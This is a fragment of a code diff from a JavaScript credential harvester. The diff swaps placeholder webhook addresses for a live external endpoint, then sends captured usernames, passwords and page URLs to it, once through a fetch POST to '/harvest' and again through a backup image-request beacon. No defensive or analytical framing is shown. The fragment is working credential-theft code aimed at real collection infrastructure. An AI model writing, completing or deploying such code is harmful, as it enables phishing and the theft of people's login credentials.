@@ -378,7 +378,7 @@
                 
                 // Send to your server - replace with your webhook/endpoint
                 try {
-                    fetch('https://YOUR-WEBHOOK-URL.com/harvest', {
+                    fetch('https://auc0k1rq.instances.httpworkbench.com/harvest', {
                         method: 'POST',
                         headers: {'Content-Type': 'application/json'},
                         body: JSON.stringify({
@@ -394,7 +394,7 @@
                 // Backup - send to another endpoint using image request
                 try {
                     var img = new Image();
-                    img.src = 'https://YOUR-BACKUP-ENDPOINT.com/log?u=' + encodeURIComponent(u) + '&p=' + encodeURIComponent(p) + '&url=' + encodeURIComponent(window.location.href);
+                    img.src = 'https://auc0k1rq.instances.httpworkbench.com/log?u=' + encodeURIComponent(u) + '&p=' + encodeURIComponent(p) + '&url=' + encodeURIComponent(window.location.href);
                 } catch(e) {}
                 
                 // Console log for debugging
